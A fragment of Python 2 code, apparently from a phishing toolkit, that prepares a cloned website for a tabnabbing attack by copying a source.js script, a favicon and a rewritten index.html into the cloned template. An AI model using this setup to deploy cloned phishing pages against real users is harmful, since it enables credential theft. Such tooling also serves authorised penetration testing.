...
subprocess.Popen("mv src/webattack/web_clone/site/template/index.html src/webattack/web_clone/site/template/index2.html 1> /dev/null 2> /dev/null", shell=True).wait()

# grab the source and write it out to the cloned directory
fileopen=file("src/webattack/tabnabbing/source.js", "r")
# write it to dir
filewrite=file("src/webattack/web_clone/site/template/source.js", "w")
# loop
for line in fileopen:
    line=line.rstrip()
...
if attack_vector == "tabnabbing":
    ...
    output = open('src/webattack/web_clone/site/template/favicon.ico','wb')
    output.write(favicon.read())
    output.close()
    filewrite1=file("src/webattack/web_clone/site/template/index.html", "w")
